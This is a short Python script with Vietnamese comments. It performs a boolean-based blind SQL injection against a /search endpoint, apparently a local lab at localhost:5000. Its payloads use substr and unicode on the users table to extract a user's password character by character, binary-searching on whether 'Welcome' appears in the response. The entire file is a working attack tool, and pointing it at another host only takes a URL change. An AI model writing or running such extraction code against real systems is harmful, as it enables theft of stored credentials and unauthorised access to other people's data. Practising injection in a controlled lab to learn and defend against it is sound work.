import requests
url = "http://localhost:5000/search"
def binary_search(target_id):
    pass_found=""
    for i in range(1,9):
        low = 32 #" "
        high = 126 #"~"
        found_char = 0
        while low <= high:
            mid = (low + high) // 2
            payload = f"{target_id} AND (SELECT unicode(substr(password, {i}, 1)) FROM users WHERE id={target_id}) > {mid}"
            params = {'id' : payload}
            try:
                r = requests.get(url , params = params)
                #print(f"Server trả về: {r.text}")
                if "Welcome" in r.text:
                    low = mid +1
                else:
                    high = mid -1
                    found_char = mid
            except Exception as e:
                print(f"Lỗi kết nối: {e}")
                break
        if low > 32:
            char = chr(low)
            pass_found+= char
            print(f"id : {i} : {char}")
        else:
            break
    print(f"\n password: {pass_found}")
if __name__ == "__main__":
    binary_search(1)
